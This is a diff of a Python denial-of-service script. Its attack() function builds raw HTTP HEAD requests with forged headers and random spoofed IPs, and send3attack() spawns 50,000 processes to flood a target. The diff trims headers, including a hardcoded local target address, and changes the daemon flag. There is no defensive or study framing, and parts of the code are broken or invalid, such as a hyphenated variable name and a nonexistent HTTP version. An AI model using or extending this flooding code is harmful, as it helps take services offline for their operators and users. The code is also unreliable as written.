@@ -52,15 +52,8 @@ def randomip():
 
 
 def attack():
-  upgrade = "websocket\r\n"
-  connection = "Upgrade\r\n"
-  host = "192.168.56.103:8080\r\n"
   connection = "Connection: null\r\n"
-  referer = "Referer: null\r\n"
-  pragma = "no-cache\r\n"
-  connection = "Connection: null\r\n"
-  referer = "Referer: null\r\n"
-  user-Agent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36\r\n"	
+  referer = "Referer: null\r\n"	
   forward = "X-Forwarded-Proto: " + randomip() + "\r\n"
   get_host = "HEAD "  + url + " HTTP/3.0\r\nHost: " + ip + "\r\n"
   request = get_host + referer  + connection + forward + "\r\n\r\n"
@@ -87,7 +80,7 @@ sleep(1)
 def send3attack():
   for i in range(50000): #Poder mágico
     mp = multiprocessing.Process(target=attack)
-    mp.setDaemon = True
+    mp.setDaemon = False
     mp.start() #Magic Starts
 
     
